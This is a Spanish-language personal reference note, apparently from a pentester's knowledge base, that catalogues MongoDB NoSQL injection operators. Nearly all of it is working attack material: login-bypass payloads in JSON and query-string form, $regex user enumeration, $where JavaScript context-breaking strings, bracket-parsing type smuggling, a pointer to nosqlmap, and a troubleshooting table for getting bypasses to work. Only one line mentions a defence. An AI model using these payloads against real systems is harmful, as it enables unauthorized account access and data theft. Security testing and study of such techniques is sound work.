---
tipo: meta
aliases:
  - operadores NoSQL
  - MongoDB operators
  - NoSQL auth bypass payloads
tags:
  - meta/referencia
  - dominio/web
---

# NoSQL operadores - matriz de referencia

> [!info] Referencia pura, no un zettel
> Los operadores y cómo se inyectan según el contexto de entrada. La extracción ciega está en [[NoSQL extracción ciega - matriz de referencia]]; el criterio, en [[MOC - NoSQL injection]].

Los ejemplos son de MongoDB, el motor más común. Otros —Couch, Elasticsearch— cambian sintaxis, no idea.

## 0. Primero: ¿la entrada llega a un objeto?

Antes de cualquier operador, confirmar cómo se parsea la entrada, porque decide si el operador entra. Ver [[NoSQL - inyección de operador]].

| Contexto | Cómo se inyecta un operador |
|---|---|
| Cuerpo JSON | Directo: `{"user":{"$ne":null}}` |
| Query string con parseo a objeto | `user[$ne]=` → `{"user":{"$ne":""}}` |
| Formulario con parseo a objeto | `user[$ne]=` igual |
| Entrada forzada a cadena | No entra. Solo queda [[NoSQL - inyección de JavaScript]] si hay `$where` |

Prueba de confirmación: mandar `{"$ne":null}` donde va una cadena y ver si la respuesta cambia.

## 1. Salto de autenticación

El uso más directo. Contra una consulta de login:

Cuerpo JSON:
```json
{"user": "admin", "pass": {"$ne": null}}
{"user": "admin", "pass": {"$gt": ""}}
{"user": {"$ne": "x"}, "pass": {"$ne": "x"}}
```

Query string:
```
user=admin&pass[$ne]=
user=admin&pass[$gt]=
user[$ne]=x&pass[$ne]=x
```

`$ne: null` y `$gt: ""` son siempre verdaderos para cualquier contraseña. El tercero entra sin conocer siquiera el usuario, devolviendo el primer documento.

## 2. Operadores de comparación

| Operador | Significa | Uso |
|---|---|---|
| `$ne` | distinto de | Salto de login, siempre-verdadero |
| `$gt` / `$gte` | mayor / mayor o igual | Siempre-verdadero con `""`, búsqueda binaria |
| `$lt` / `$lte` | menor / menor o igual | Búsqueda binaria |
| `$in` | está en la lista | Probar varios valores de una |
| `$nin` | no está en la lista | Negación |
| `$exists` | el campo existe | Enumerar estructura del documento |

## 3. `$regex` — coincidencia parcial

La llave de la enumeración y de la extracción ciega:

```json
{"user": {"$regex": "^adm"}}
{"user": {"$regex": "admin", "$options": "i"}}
```

`^adm` encuentra usuarios que empiezan con `adm`. `$options: "i"` lo hace insensible a mayúsculas. Es también el oráculo de [[NoSQL - extracción ciega]] — ahí se detalla la extracción carácter por carácter.

Enumerar usuarios existentes:
```
user[$regex]=^a&pass[$ne]=   → ¿hay algún usuario que empiece con 'a'?
```

## 4. `$where` — JavaScript

Ver [[NoSQL - inyección de JavaScript]]. Cuando la entrada llega a un `$where`:

```json
{"$where": "this.user == 'admin' || '1'=='1'"}
{"$where": "1==1"}
{"$where": "return true"}
```

Ruptura de contexto si la entrada se concatena dentro de un `$where` existente:
```
' || '1'=='1
'; return true; var x='
```

## 5. `$expr` y agregación

En consultas que usan el marco de agregación:

```json
{"$expr": {"$eq": [1, 1]}}
```

`mapReduce`, `$accumulator`, `$function` evalúan JavaScript igual que `$where` — mismos payloads de la § 4, distinto punto de entrada.

## 6. Contrabando de tipo en query string

Los frameworks que parsean corchetes convierten la query en objetos anidados. Esto habilita operadores sin cuerpo JSON:

| Query string | Objeto resultante |
|---|---|
| `q[$ne]=1` | `{"q":{"$ne":"1"}}` |
| `q[$regex]=^a` | `{"q":{"$regex":"^a"}}` |
| `q[$where]=...` | `{"q":{"$where":"..."}}` |
| `q[$gt]=` | `{"q":{"$gt":""}}` |

Es el vector más discreto: parece un parámetro con corchetes, no un payload de inyección.

## 7. Herramienta

`nosqlmap` — automatiza el salto de auth y la extracción.
`mongo-tools` para conectarse si se consiguen credenciales.

## 8. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| El operador se refleja como `"[object Object]"` | La entrada se fuerza a cadena. Rama de operador cerrada |
| `$ne` no cambia nada | La entrada no llega a un objeto de consulta. Probar `$where` |
| El salto de login no entra | Puede haber un segundo control (2FA, hash previo). Revisar el flujo |
| `$where` da error de sintaxis JS | Hay evaluación de JS: ajustar la ruptura de contexto |
| El corchete no parsea a objeto | El framework no soporta corchetes anidados. Ir a cuerpo JSON |
| Todo devuelve el mismo documento | `$ne` con dos campos trae el primero; refinar con `$regex` |
| Clave `$` rechazada | Hay validación de esquema. Buena mitigación |

## Relacionadas

[[MOC - NoSQL injection]] · [[NoSQL extracción ciega - matriz de referencia]] · [[NoSQL - inyección de operador]] · [[SQLi contextos - matriz de referencia]]
